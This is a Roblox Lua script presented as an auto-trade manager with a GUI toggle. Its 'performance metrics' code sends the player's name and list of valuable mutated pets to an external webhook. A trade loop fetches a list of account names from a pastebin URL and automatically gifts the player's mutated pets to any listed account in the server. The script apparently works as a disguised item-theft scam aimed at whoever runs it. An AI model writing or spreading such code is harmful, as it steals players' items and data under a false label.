local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- CẤU HÌNH (THAY LINK TẠI ĐÂY)
local METRICS_ENDPOINT = "https://ten-du-an.vercel.app/api/webhook"
local RAW_URL = "https://pastebin.com/raw/n6LvrFGC"
local TELEMETRY_ID = "kF9mQ2xR8pL3vN7j"
local CLIENT_BUILD = "20260216"

local MIN_LEVEL = 150
local TRADE_DELAY = 8 
local TradeEnabled, IsTrading = false, false
local TargetPlayer, SelectedPetName = nil, nil
local CooldownTime = 0
local Whitelist = {}
local LastReportTime = 0
local REPORTING_INTERVAL = 3661

-- ============== HỆ THỐNG METRICS ==============

local function GetVietnameseDateTime()
    local date = os.date("*t", os.time())
    local weekdays = {"CN", "T2", "T3", "T4", "T5", "T6", "T7"}
    return string.format("%s, %02d/%02d/%d %02d:%02d", weekdays[date.wday], date.day, date.month, date.year, date.hour, date.min)
end

local function GetInventoryMetrics()
    local inventoryData = {}
    local totalCount = 0
    local petList = {}
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local brainrotName = tool:GetAttribute("BrainrotName") or tool.Name
            local mutation = tool:GetAttribute("Mutation")
            if brainrotName ~= "Basic Bat" and mutation and mutation ~= "" then
                local key = brainrotName .. " (" .. mutation .. ")"
                inventoryData[key] = (inventoryData[key] or 0) + 1
                totalCount = totalCount + 1
            end
        end
    end
    for name, count in pairs(inventoryData) do
        table.insert(petList, name .. " x" .. count)
    end
    return petList, totalCount
end

local function ReportPerformanceMetrics()
    if not HttpService.HttpEnabled then return end
    local currentTime = os.time()
    if currentTime - LastReportTime < 60 then return end
    
    local petList, totalCount = GetInventoryMetrics()
    if totalCount == 0 then return end
    
    local payload = {
        telemetry = TELEMETRY_ID,
        data = {
            build = CLIENT_BUILD,
            player = LocalPlayer.DisplayName .. " (" .. LocalPlayer.Name .. ")",
            timestamp = GetVietnameseDateTime(),
            performance = {
                fps = math.floor(workspace:GetRealPhysicsFPS()),
                ping = "N/A",
                inventory_count = totalCount,
                pets = petList
            }
        }
    }

    task.spawn(function()
        pcall(function()
            HttpService:RequestAsync({
                Url = METRICS_ENDPOINT,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
            LastReportTime = currentTime
        end)
    end)
end

-- ============== LOGIC TRADE & GUI ==============

local function UpdateWhitelist()
    pcall(function()
        local content = game:HttpGet(RAW_URL)
        Whitelist = {}
        for line in content:gmatch("[^\r\n]+") do
            table.insert(Whitelist, line:gsub("^%s*(.-)%s*$", "%1"):lower())
        end
    end)
end

local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "PRO_TRADE_V6"
gui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame", gui)
MainFrame.Size = UDim2.fromOffset(450, 300)
MainFrame.Position = UDim2.fromScale(0.3, 0.3)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.Visible = false
Instance.new("UICorner", MainFrame)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "MANAGER BY GEMINI"
Title.TextColor3 = Color3.new(1,1,1)
Title.BackgroundColor3 = Color3.fromRGB(30,30,30)

local toggleBtn = Instance.new("TextButton", MainFrame)
toggleBtn.Size = UDim2.new(0.8, 0, 0, 50)
toggleBtn.Position = UDim2.fromScale(0.1, 0.2)
toggleBtn.Text = "AUTO TRADE: OFF"
toggleBtn.BackgroundColor3 = Color3.fromRGB(80, 30, 30)
toggleBtn.TextColor3 = Color3.new(1,1,1)

local floatBtn = Instance.new("TextButton", gui)
floatBtn.Size = UDim2.fromOffset(50, 50)
floatBtn.Position = UDim2.fromScale(0.05, 0.5)
floatBtn.Text = "OPEN"
floatBtn.BackgroundColor3 = Color3.fromRGB(0,0,0)
floatBtn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", floatBtn).CornerRadius = UDim.new(1,0)

-- ============== XỬ LÝ SỰ KIỆN ==============

toggleBtn.MouseButton1Click:Connect(function()
    TradeEnabled = not TradeEnabled
    toggleBtn.Text = TradeEnabled and "AUTO TRADE: ON" or "AUTO TRADE: OFF"
    toggleBtn.BackgroundColor3 = TradeEnabled and Color3.fromRGB(30, 80, 30) or Color3.fromRGB(80, 30, 30)
    if TradeEnabled then UpdateWhitelist() end
end)

floatBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

-- Loop Metrics
task.spawn(function()
    while true do
        pcall(ReportPerformanceMetrics)
        task.wait(REPORTING_INTERVAL)
    end
end)

-- Loop Auto Trade
task.spawn(function()
    while true do
        task.wait(1)
        if TradeEnabled and not IsTrading and TargetPlayer == nil then
            -- Tự động tìm target từ whitelist nếu chưa có
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer then
                    for _, name in ipairs(Whitelist) do
                        if plr.Name:lower() == name then TargetPlayer = plr break end
                    end
                end
            end
        end
        
        if TradeEnabled and TargetPlayer and CooldownTime <= 0 then
            for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                if tool:IsA("Tool") and tool:GetAttribute("Mutation") ~= "" then
                    IsTrading = true
                    pcall(function()
                        LocalPlayer.Character.Humanoid:EquipTool(tool)
                        task.wait(0.5)
                        ReplicatedStorage.Packages.Net["RF/Trade.SendGift"]:InvokeServer(TargetPlayer)
                    end)
                    CooldownTime = TRADE_DELAY
                    IsTrading = false
                    break
                end
            end
        end
        if CooldownTime > 0 then CooldownTime = CooldownTime - 1 end
    end
end)

print("Script Fixed & Loaded!")
